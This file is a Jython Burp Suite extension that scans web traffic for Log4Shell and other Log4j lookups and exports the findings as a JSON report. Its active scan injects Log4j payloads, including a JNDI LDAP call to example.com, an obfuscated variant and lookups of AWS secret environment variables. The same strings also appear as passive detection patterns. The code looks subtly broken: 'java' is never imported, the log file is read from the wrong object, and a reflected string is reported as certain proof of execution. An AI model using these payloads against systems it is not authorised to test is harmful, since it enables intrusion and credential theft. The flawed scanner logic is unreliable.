import re
import json
import os
from datetime import datetime
from burp import IBurpExtender, IScannerCheck, IScanIssue, ITab
from javax.swing import JPanel, JButton, JFileChooser
from java.awt import BorderLayout

class BurpExtender(IBurpExtender, ITab):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Enhanced CVE Checker")
        callbacks.registerScannerCheck(self.CVEScanner(self._callbacks, self._helpers))
        self._log_file = "vulnerability_log.json"

        # Initialize log file
        if not os.path.exists(self._log_file):
            with open(self._log_file, 'w') as log:
                json.dump([], log)

        # UI for extension
        self._jPanel = JPanel(BorderLayout())
        self._export_button = JButton("Export Report", actionPerformed=self.export_report)
        self._jPanel.add(self._export_button, BorderLayout.PAGE_END)
        callbacks.addSuiteTab(self)
    
    def getTabCaption(self):
        return "CVE Checker"
    
    def getUiComponent(self):
        return self._jPanel

    def export_report(self, event):
        chooser = JFileChooser()
        chooser.setDialogTitle("Save Report")
        chooser.setSelectedFile(java.io.File("vulnerability_report.json"))
        if chooser.showSaveDialog(self._jPanel) == JFileChooser.APPROVE_OPTION:
            file = chooser.getSelectedFile()
            with open(file.getAbsolutePath(), 'w') as report_file:
                with open(self._log_file, 'r') as log_file:
                    log_data = json.load(log_file)
                    json.dump(log_data, report_file, indent=4)
            print("Report exported to", file.getAbsolutePath())

    class CVEScanner(IScannerCheck):
        def __init__(self, callbacks, helpers):
            self._callbacks = callbacks
            self._helpers = helpers

        def doPassiveScan(self, baseRequestResponse):
            issues = []
            request = baseRequestResponse.getRequest()
            response = baseRequestResponse.getResponse()
            if response:
                response_info = self._helpers.analyzeResponse(response)
                response_body = response.tostring()[response_info.getBodyOffset():]

                # Check for Log4Shell patterns
                log4shell_patterns = [
                    b'\${jndi:ldap://', b'\${jndi:rmi://', b'\${jndi:ldaps://',
                    b'\${jndi:dns://', b'\${jndi:iiop://', b'\${jndi:corba://',
                    b'\${jndi:nds://', b'\${jndi:nis://', b'\${jndi:rfc://'
                ]
                for pattern in log4shell_patterns:
                    if re.search(pattern, response_body):
                        issue = ScanIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [self._callbacks.applyMarkers(baseRequestResponse, None, [[response_info.getBodyOffset(), len(response_body)]])],
                            "Potential CVE-2021-44228 (Log4Shell) vulnerability detected",
                            "The response contains a JNDI lookup that might be vulnerable.",
                            "High"
                        )
                        issues.append(issue)
                        self.log_issue(issue)

                # Check for other Log4j-related patterns
                log4j_patterns = [
                    b'\${sys:os.name}', b'\${env:}', b'\${sys:}', b'\${env:AWS_SECRET_ACCESS_KEY}',
                    b'\${java:version}', b'\${java:os}', b'\${env:AWS_SESSION_TOKEN}',
                    b'\${env:AWS_ACCESS_KEY_ID}', b'\${main:ARGS}'
                ]
                for pattern in log4j_patterns:
                    if re.search(pattern, response_body):
                        issue = ScanIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [self._callbacks.applyMarkers(baseRequestResponse, None, [[response_info.getBodyOffset(), len(response_body)]])],
                            "Potential Log4j vulnerability detected",
                            "The response contains a potentially vulnerable Log4j expression.",
                            "High"
                        )
                        issues.append(issue)
                        self.log_issue(issue)
            return issues

        def doActiveScan(self, baseRequestResponse, insertionPoint):
            issues = []
            # Inject payloads into different parts of the request
            payloads = [
                '${jndi:ldap://example.com/a}', '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com/a}',
                '${sys:os.name}', '${env:AWS_SECRET_ACCESS_KEY}', '${java:version}'
            ]
            for payload in payloads:
                request = insertionPoint.buildRequest(payload.encode())
                response = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request)
                response_info = self._helpers.analyzeResponse(response)
                response_body = response.tostring()[response_info.getBodyOffset():]
                
                # Check response for indications of payload execution
                if re.search(b'\${jndi:ldap://', response_body) or re.search(b'\${sys:os.name}', response_body):
                    issue = ScanIssue(
                        baseRequestResponse.getHttpService(),
                        self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        [self._callbacks.applyMarkers(response, None, [[response_info.getBodyOffset(), len(response_body)]])],
                        "Potential Log4j exploit detected (Active Scan)",
                        "The response contains an expression that indicates payload execution.",
                        "High"
                    )
                    issues.append(issue)
                    self.log_issue(issue)
            return issues

        def consolidateDuplicateIssues(self, existingIssue, newIssue):
            return existingIssue.getIssueDetail() == newIssue.getIssueDetail()

        def log_issue(self, issue):
            log_entry = {
                "url": str(issue.getUrl()),
                "name": issue.getIssueName(),
                "severity": issue.getSeverity(),
                "detail": issue.getIssueDetail(),
                "timestamp": datetime.utcnow().isoformat()
            }
            with open(self._callbacks._log_file, 'r+') as log_file:
                log_data = json.load(log_file)
                log_data.append(log_entry)
                log_file.seek(0)
                json.dump(log_data, log_file, indent=4)

class ScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
